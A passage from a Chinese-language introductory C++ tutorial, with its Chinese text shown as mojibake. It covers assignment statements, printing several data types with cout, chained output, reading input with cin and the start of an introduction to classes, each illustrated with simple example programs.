carrots = <span class="number">25</span>; <span class="comment">// èµ‹å€¼</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;I have &quot;</span> &lt;&lt; carrots &lt;&lt; <span class="string">&quot; carrots.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Fleas: &quot;</span> &lt;&lt; fleas &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hamsters: &quot;</span> &lt;&lt; hamsters &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Rats: &quot;</span> &lt;&lt; rats &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <strong>å£°æ˜ (Declaration):</strong> å‘Šè¯‰ç¼–è¯‘å™¨å˜é‡çš„åç§°å’Œç±»å‹ã€‚</li><li>  <strong>å®šä¹‰ (Definition):</strong> å£°æ˜é€šå¸¸ä¹Ÿæ˜¯å®šä¹‰ï¼Œå› ä¸ºå®ƒä¼šä¸ºå˜é‡åˆ†é…å†…å­˜ç©ºé—´ã€‚</li><li>  <strong>åˆå§‹åŒ– (Initialization):</strong> åœ¨å£°æ˜å˜é‡çš„åŒæ—¶ç»™å®ƒèµ‹ä¸€ä¸ªåˆå§‹å€¼ã€‚è¿™æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ï¼Œå¯ä»¥é¿å…ä½¿ç”¨æœªå®šä¹‰çš„å€¼ã€‚</li></ul><h3 id="2-2-2-èµ‹å€¼è¯­å¥"><a href="#2-2-2-èµ‹å€¼è¯­å¥" class="headerlink" title="2.2.2 èµ‹å€¼è¯­å¥"></a>2.2.2 èµ‹å€¼è¯­å¥</h3><p><strong>èµ‹å€¼è¯­å¥ (Assignment Statement)</strong> ç”¨äºå°†ä¸€ä¸ªå€¼èµ‹ç»™ä¸€ä¸ªå˜é‡ã€‚å®ƒä½¿ç”¨èµ‹å€¼è¿ç®—ç¬¦ <code>=</code>ã€‚</p><p><strong>è¯­æ³•:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">variableName = value;</span><br></pre></td></tr></table></figure><ul><li>  <code>variableName</code>: è¦æ¥æ”¶å€¼çš„å˜é‡çš„åç§°ï¼ˆå¿…é¡»æ˜¯å·²å£°æ˜çš„å˜é‡ï¼‰ã€‚</li><li>  <code>value</code>: è¦èµ‹ç»™å˜é‡çš„å€¼ã€‚è¿™å¯ä»¥æ˜¯ä¸€ä¸ªå­—é¢å¸¸é‡ï¼ˆå¦‚ <code>25</code>ï¼‰ã€å¦ä¸€ä¸ªå˜é‡ã€æˆ–ä¸€ä¸ªè¡¨è¾¾å¼çš„ç»“æœã€‚</li></ul><p><strong>é‡è¦æ¦‚å¿µ:</strong></p><ul><li>  èµ‹å€¼æ“ä½œæ˜¯å°†<strong>å³ä¾§</strong>çš„å€¼å¤åˆ¶åˆ°<strong>å·¦ä¾§</strong>çš„å˜é‡ä¸­ã€‚</li><li>  å·¦ä¾§å¿…é¡»æ˜¯ä¸€ä¸ªå¯ä¿®æ”¹çš„**å·¦å€¼ (lvalue)**ï¼Œé€šå¸¸å°±æ˜¯ä¸€ä¸ªå˜é‡åã€‚</li><li>  å³ä¾§å¯ä»¥æ˜¯ä¸€ä¸ª**å³å€¼ (rvalue)**ï¼Œå³ä¸€ä¸ªå¯ä»¥äº§ç”Ÿå€¼çš„è¡¨è¾¾å¼ã€‚</li></ul><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> carrots; <span class="comment">// å£°æ˜å˜é‡</span></span><br><span class="line">    </span><br><span class="line">    carrots = <span class="number">25</span>; <span class="comment">// èµ‹å€¼è¯­å¥ï¼šå°† 25 èµ‹ç»™ carrots</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Now I have &quot;</span> &lt;&lt; carrots &lt;&lt; <span class="string">&quot; carrots.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    carrots = carrots - <span class="number">1</span>; <span class="comment">// èµ‹å€¼è¯­å¥ï¼šå°†è¡¨è¾¾å¼ carrots - 1 çš„ç»“æœ (24) èµ‹ç»™ carrots</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Crunch, crunch. Now I have &quot;</span> &lt;&lt; carrots &lt;&lt; <span class="string">&quot; carrots.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> dogs = <span class="number">5</span>; <span class="comment">// å£°æ˜å¹¶åˆå§‹åŒ–</span></span><br><span class="line">    <span class="keyword">int</span> cats;     <span class="comment">// å£°æ˜</span></span><br><span class="line">    </span><br><span class="line">    cats = dogs;  <span class="comment">// èµ‹å€¼è¯­å¥ï¼šå°† dogs çš„å€¼ (5) èµ‹ç»™ cats</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Dogs: &quot;</span> &lt;&lt; dogs &lt;&lt; <span class="string">&quot;, Cats: &quot;</span> &lt;&lt; cats &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¯ä»¥é“¾å¼èµ‹å€¼ (ä»å³å‘å·¦æ‰§è¡Œ)</span></span><br><span class="line">    <span class="keyword">int</span> a, b, c;</span><br><span class="line">    a = b = c = <span class="number">10</span>; <span class="comment">// c=10, ç„¶å b=c (å³ b=10), ç„¶å a=b (å³ a=10)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;a=&quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot;, b=&quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot;, c=&quot;</span> &lt;&lt; c &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2-2-3-coutçš„æ–°èŠ±æ ·"><a href="#2-2-3-coutçš„æ–°èŠ±æ ·" class="headerlink" title="2.2.3 coutçš„æ–°èŠ±æ ·"></a>2.2.3 coutçš„æ–°èŠ±æ ·</h3><p>æˆ‘ä»¬åœ¨ 2.1.6 èŠ‚å·²ç»å­¦ä¹ äº†å¦‚ä½•ä½¿ç”¨ <code>cout</code> è¾“å‡ºå­—ç¬¦ä¸²å’Œä½¿ç”¨ <code>endl</code> æ¢è¡Œã€‚<code>cout</code> çš„ä¸€ä¸ªå¼ºå¤§ä¹‹å¤„åœ¨äºå®ƒçš„â€œæ™ºèƒ½â€ï¼Œå®ƒå¯ä»¥è¯†åˆ«å¹¶æ­£ç¡®æ˜¾ç¤ºå¤šç§ä¸åŒç±»å‹çš„æ•°æ®ã€‚</p><p><code>cout</code> å¯¹è±¡ä¸æ’å…¥è¿ç®—ç¬¦ <code>&lt;&lt;</code> ç»“åˆä½¿ç”¨ï¼Œå¯ä»¥è‡ªåŠ¨å¤„ç† C++ çš„å†…ç½®æ•°æ®ç±»å‹ï¼Œå¦‚æ•´æ•° (<code>int</code>)ã€æµ®ç‚¹æ•° (<code>double</code>, <code>float</code>)ã€å­—ç¬¦ (<code>char</code>) ä»¥åŠ C é£æ ¼å­—ç¬¦ä¸²å’Œ <code>std::string</code> å¯¹è±¡ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // åŒ…å« string ç±»</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">30</span>;</span><br><span class="line">    <span class="keyword">double</span> weight = <span class="number">65.5</span>;</span><br><span class="line">    <span class="keyword">char</span> initial = <span class="string">&#x27;J&#x27;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name = <span class="string">&quot;Alice&quot;</span>; <span class="comment">// C++ string å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* city = <span class="string">&quot;New York&quot;</span>; <span class="comment">// C é£æ ¼å­—ç¬¦ä¸²</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// cout å¯ä»¥è‡ªåŠ¨å¤„ç†ä¸åŒç±»å‹</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;--- Personal Information ---&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å‡ºæ•´æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Age: &quot;</span>; <span class="comment">// è¾“å‡ºæç¤ºä¿¡æ¯</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; age;     <span class="comment">// è¾“å‡º age å˜é‡çš„å€¼ (æ•´æ•°)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// æ¢è¡Œ</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å‡ºæµ®ç‚¹æ•°</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Weight: &quot;</span> &lt;&lt; weight &lt;&lt; <span class="string">&quot; kg&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// é“¾å¼è¾“å‡º</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å‡ºå­—ç¬¦</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Initial: &quot;</span> &lt;&lt; initial &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å‡º C++ string å¯¹è±¡</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span> &lt;&lt; name &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å‡º C é£æ ¼å­—ç¬¦ä¸²</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;City: &quot;</span> &lt;&lt; city &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ··åˆè¾“å‡º</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; age &lt;&lt; <span class="string">&quot; years old and lives in &quot;</span> &lt;&lt; city &lt;&lt; <span class="string">&quot;.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¾“å‡ºè¡¨è¾¾å¼ç»“æœ</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Next year, &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; will be &quot;</span> &lt;&lt; age + <span class="number">1</span> &lt;&lt; <span class="string">&quot; years old.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>cout</code> ä¹‹æ‰€ä»¥èƒ½åšåˆ°è¿™ä¸€ç‚¹ï¼Œæ˜¯å› ä¸º <code>&lt;&lt;</code> è¿ç®—ç¬¦é’ˆå¯¹ä¸åŒçš„æ•°æ®ç±»å‹è¿›è¡Œäº†**é‡è½½ (Overloading)**ï¼ˆæˆ‘ä»¬å°†åœ¨åç»­ç« èŠ‚è¯¦ç»†å­¦ä¹ ï¼‰ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯ä¸º <code>&lt;&lt;</code> è¿ç®—ç¬¦å®šä¹‰äº†å¤šä¸ªç‰ˆæœ¬ï¼Œæ¯ä¸ªç‰ˆæœ¬çŸ¥é“å¦‚ä½•å¤„ç†ç‰¹å®šç±»å‹çš„æ•°æ®ï¼Œå¹¶å°†å®ƒä»¬è½¬æ¢ä¸ºé€‚åˆè¾“å‡ºçš„å­—ç¬¦åºåˆ—ã€‚</p><h2 id="2-3-å…¶ä»–C-è¯­å¥"><a href="#2-3-å…¶ä»–C-è¯­å¥" class="headerlink" title="2.3 å…¶ä»–C++è¯­å¥"></a>2.3 å…¶ä»–C++è¯­å¥</h2><p>æœ¬èŠ‚å°†ä»‹ç»æ›´å¤šC++è¯­å¥ï¼ŒåŒ…æ‹¬å¦‚ä½•ä»ç”¨æˆ·é‚£é‡Œè·å–è¾“å…¥ï¼Œå¦‚ä½•æ›´çµæ´»åœ°ä½¿ç”¨ <code>cout</code>ï¼Œå¹¶å¯¹C++çš„æ ¸å¿ƒæ¦‚å¿µâ€”â€”ç±»è¿›è¡Œåˆæ­¥ä»‹ç»ã€‚</p><h3 id="2-3-1-ä½¿ç”¨cin"><a href="#2-3-1-ä½¿ç”¨cin" class="headerlink" title="2.3.1 ä½¿ç”¨cin"></a>2.3.1 ä½¿ç”¨cin</h3><p>ä¸ <code>cout</code> ç”¨äºè¾“å‡ºç±»ä¼¼ï¼Œ<code>cin</code> æ˜¯ <code>iostream</code> åº“ä¸­é¢„å®šä¹‰çš„ä¸€ä¸ªå¯¹è±¡ï¼Œä»£è¡¨æ ‡å‡†è¾“å…¥æµï¼Œé€šå¸¸è¿æ¥åˆ°é”®ç›˜ã€‚æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>cin</code> æ¥è¯»å–ç”¨æˆ·è¾“å…¥çš„æ•°æ®ã€‚</p><p><code>&gt;&gt;</code> è¿ç®—ç¬¦ï¼ˆæå–è¿ç®—ç¬¦ï¼‰ç”¨äºä» <code>cin</code> å¯¹è±¡è·å–æ•°æ®ï¼Œå¹¶å°†å…¶å­˜å‚¨åˆ°å˜é‡ä¸­ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt; // å¿…é¡»åŒ…å« iostream ä»¥ä½¿ç”¨ cin å’Œ cout</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> carrots; <span class="comment">// å£°æ˜ä¸€ä¸ªæ•´å‹å˜é‡æ¥å­˜å‚¨è¾“å…¥</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;How many carrots do you have?&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; <span class="comment">// æç¤ºç”¨æˆ·è¾“å…¥</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; carrots; <span class="comment">// ä»é”®ç›˜è¯»å–ä¸€ä¸ªæ•´æ•°ï¼Œå¹¶å­˜å‚¨åˆ° carrots å˜é‡ä¸­</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Here are two more. &quot;</span>;</span><br><span class="line">    carrots = carrots + <span class="number">2</span>; <span class="comment">// å¯¹å˜é‡è¿›è¡Œæ“ä½œ</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">// è¾“å‡ºç»“æœ</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Now you have &quot;</span> &lt;&lt; carrots &lt;&lt; <span class="string">&quot; carrots.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è¯»å–å…¶ä»–ç±»å‹çš„æ•°æ®</span></span><br><span class="line">    <span class="keyword">double</span> price;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Enter the price per carrot: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span> &gt;&gt; price; <span class="comment">// è¯»å–ä¸€ä¸ªæµ®ç‚¹æ•°</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;The total cost for &quot;</span> &lt;&lt; carrots &lt;&lt; <span class="string">&quot; carrots is: &quot;</span> </span><br><span class="line">              &lt;&lt; carrots * price &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>#include &lt;iostream&gt;</code>: ä½¿ç”¨ <code>cin</code> åŒæ ·éœ€è¦åŒ…å«æ­¤å¤´æ–‡ä»¶ã€‚</li><li>  <code>std::cin</code>: <code>cin</code> å¯¹è±¡ä¹Ÿä½äº <code>std</code> åç§°ç©ºé—´ä¸­ã€‚</li><li>  <code>cin &gt;&gt; variable;</code>: æå–è¿ç®—ç¬¦ <code>&gt;&gt;</code> ä»è¾“å…¥æµï¼ˆé”®ç›˜ï¼‰ä¸­è¯»å–æ•°æ®ï¼Œå¹¶æ ¹æ® <code>variable</code> çš„ç±»å‹è¿›è¡Œè§£é‡Šï¼Œç„¶åå°†å€¼å­˜å…¥ <code>variable</code>ã€‚<code>cin</code> ä¹Ÿä¼šæ ¹æ®è¯»å–çš„æ•°æ®ç±»å‹è‡ªåŠ¨è¿›è¡Œè½¬æ¢ã€‚</li><li>  <strong>è¾“å…¥åˆ†éš”:</strong> <code>cin</code> é€šå¸¸ä½¿ç”¨ç©ºç™½ï¼ˆç©ºæ ¼ã€åˆ¶è¡¨ç¬¦ã€æ¢è¡Œç¬¦ï¼‰æ¥åˆ†éš”ä¸åŒçš„è¾“å…¥é¡¹ã€‚ä¾‹å¦‚ï¼Œå¦‚æœç¨‹åºæœŸæœ›è¯»å–ä¸¤ä¸ªæ•´æ•° <code>cin &gt;&gt; a &gt;&gt; b;</code>ï¼Œç”¨æˆ·å¯ä»¥è¾“å…¥ <code>10 20</code> ç„¶åæŒ‰ Enterï¼Œæˆ–è€…è¾“å…¥ <code>10</code> æŒ‰ Enter å†è¾“å…¥ <code>20</code> æŒ‰ Enterã€‚</li></ul><h3 id="2-3-2-ä½¿ç”¨coutè¿›è¡Œæ‹¼æ¥"><a href="#2-3-2-ä½¿ç”¨coutè¿›è¡Œæ‹¼æ¥" class="headerlink" title="2.3.2 ä½¿ç”¨coutè¿›è¡Œæ‹¼æ¥"></a>2.3.2 ä½¿ç”¨coutè¿›è¡Œæ‹¼æ¥</h3><p>æˆ‘ä»¬åœ¨å‰é¢å·²ç»çœ‹åˆ°å¦‚ä½•ä½¿ç”¨ <code>cout</code> å’Œæ’å…¥è¿ç®—ç¬¦ <code>&lt;&lt;</code> è¾“å‡ºå•ä¸ªå€¼æˆ–å­—ç¬¦ä¸²ã€‚<code>cout</code> çš„ä¸€ä¸ªä¾¿æ·ä¹‹å¤„åœ¨äºï¼Œä½ å¯ä»¥åœ¨ä¸€æ¡è¯­å¥ä¸­è¿ç»­ä½¿ç”¨ <code>&lt;&lt;</code> è¿ç®—ç¬¦ï¼Œå°†å¤šä¸ªè¾“å‡ºé¡¹â€œæ‹¼æ¥â€åœ¨ä¸€èµ·ã€‚è¿™ç§°ä¸º**é“¾å¼è¾“å‡º (Chaining Output)**ã€‚</p><p><strong>ç”¨æ³•ä¸ç¤ºä¾‹:</strong></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt; // åŒ…å« string ç±»å‹</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> age = <span class="number">28</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> name = <span class="string">&quot;Bob&quot;</span>;</span><br><span class="line">    <span class="keyword">double</span> weight = <span class="number">75.3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä¸ä½¿ç”¨æ‹¼æ¥çš„å†™æ³• (å¤šæ¡è¯­å¥)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; name;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;, Age: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; age;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;, Weight: &quot;</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; weight;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨æ‹¼æ¥çš„å†™æ³• (å•æ¡è¯­å¥ï¼Œæ›´ç®€æ´)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Name: &quot;</span> &lt;&lt; name </span><br><span class="line">              &lt;&lt; <span class="string">&quot;, Age: &quot;</span> &lt;&lt; age </span><br><span class="line">              &lt;&lt; <span class="string">&quot;, Weight: &quot;</span> &lt;&lt; weight </span><br><span class="line">              &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ‹¼æ¥ä¸åŒç±»å‹çš„æ•°æ®</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;In 5 years, &quot;</span> &lt;&lt; name &lt;&lt; <span class="string">&quot; will be &quot;</span> &lt;&lt; (age + <span class="number">5</span>) &lt;&lt; <span class="string">&quot; years old.&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>  <code>cout &lt;&lt; item1 &lt;&lt; item2 &lt;&lt; item3;</code>: <code>cout</code> å¯¹è±¡åœ¨å¤„ç†å®Œç¬¬ä¸€ä¸ª <code>&lt;&lt; item1</code> åï¼Œä¼šè¿”å›è‡ªèº« (<code>cout</code>)ï¼Œå› æ­¤å¯ä»¥ç»§ç»­å¤„ç†ä¸‹ä¸€ä¸ª <code>&lt;&lt; item2</code>ï¼Œä»¥æ­¤ç±»æ¨ã€‚</li><li>  è¿™ç§é“¾å¼è°ƒç”¨ä½¿å¾—å°†å˜é‡å€¼ã€å­—ç¬¦ä¸²å­—é¢é‡å’Œè¡¨è¾¾å¼ç»“æœç»„åˆè¾“å‡ºå˜å¾—éå¸¸æ–¹ä¾¿å’Œæ˜“è¯»ã€‚</li></ul><h3 id="2-3-3-ç±»ç®€ä»‹"><a href="#2-3-3-ç±»ç®€ä»‹" class="headerlink" title="2.3.3 ç±»ç®€ä»‹"></a>2.3.3 ç±»ç®€ä»‹</h3><p><strong>ç±» (Class)</strong> æ˜¯C++çš„æ ¸å¿ƒæ¦‚å¿µï¼Œä¹Ÿæ˜¯é¢å‘å¯¹è±¡ç¼–ç¨‹ï¼ˆOOPï¼‰çš„åŸºç¡€ã€‚å¯ä»¥æŠŠç±»çœ‹ä½œæ˜¯åˆ›å»º<strong>å¯¹è±¡ (Object)</strong> çš„è“å›¾æˆ–æ¨¡æ¿ã€‚</p><ul><li>  <strong>å°è£… (Encapsulation):</strong> ç±»å°†<strong>æ•°æ®ï¼ˆç§°ä¸ºæˆå‘˜å˜é‡æˆ–å±æ€§ï¼‰</strong>å’Œ<strong>æ“ä½œè¿™äº›æ•°æ®çš„å‡½æ•°ï¼ˆç§°ä¸ºæˆå‘˜å‡½æ•°æˆ–æ–¹æ³•ï¼‰</strong>æ†ç»‘åœ¨ä¸€èµ·ã€‚</li><li>  <strong>æŠ½è±¡ (Abstraction):</strong> ç±»æä¾›äº†ä¸€ä¸ªæ¥å£ï¼ˆé€šè¿‡å…¶å…¬æœ‰æˆå‘˜å‡½æ•°ï¼‰ï¼Œéšè—äº†å†…éƒ¨å®ç°çš„å¤æ‚ç»†èŠ‚ã€‚</li></ul><p>æˆ‘ä»¬å·²ç»åœ¨ä½¿ç”¨ç±»çš„å¯¹è±¡äº†ï¼<code>cout</code> å’Œ <code>cin</code> å°±æ˜¯ C++ æ ‡å‡†åº“ä¸­å®šä¹‰çš„ç±»çš„å¯¹è±¡ï¼š</p><ul><li>  <code>cout</code> æ˜¯ 